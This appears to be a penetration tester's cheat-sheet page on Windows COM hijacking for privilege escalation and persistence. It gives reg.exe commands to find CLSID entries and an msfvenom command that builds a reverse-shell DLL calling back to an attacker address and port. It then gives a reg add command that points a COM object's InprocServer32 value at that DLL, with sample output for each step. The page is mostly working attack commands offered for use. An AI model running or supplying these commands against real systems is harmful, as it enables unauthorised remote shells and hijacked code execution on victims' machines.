---
title: "Registry"
date: 2025-7-14
tags: ["Windows", "Registry", "reg.exe", "Windows Internals", "Persistence", "COM Hijacking", "DLL Injection"]
---

### Privesc #1: COM Hijacking

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Query Registry

```console
# Queries all CLSID entries recursively
reg query HKCR\CLSID /s
```

```console
# Queries CLSID entries containing KEYWORD recursively
reg query HKCR\CLSID /s /f "<KEYWORD>"
```

```console {class="sample-code"}
PS C:\Windows\system32> reg query HKCR\CLSID /s /f "zip"
reg query HKCR\CLSID /s /f "zip"

HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_CLASSES_ROOT\CLSID\{2317---[SNIP]---20000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll

---[SNIP]---
```

#### 2. Create Malicious DLL

```console
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll
```

```console {class="sample-code"}
$ msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.10.10 LPORT=1337 > rev.dll
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
```

#### 2. Replace Default Value

```console
reg add "HKLM\Software\Classes\CLSID\<CLSID>\InprocServer32" /ve /d "<CUSTOM_DLL>" /f
```

```console {class="sample-code"}
PS C:\Windows\system32> reg add "HKLM\Software\Classes\CLSID\{2317---[SNIP]---20000}\InprocServer32" /ve /d "C:\programdata\rev.dll" /f
reg add "HKLM\Software\Classes\CLSID\{2317---[SNIP]---20000}\InprocServer32" /ve /d "C:\programdata\rev.dll" /f
The operation completed successfully.
```

{{< /tabcontent >}}
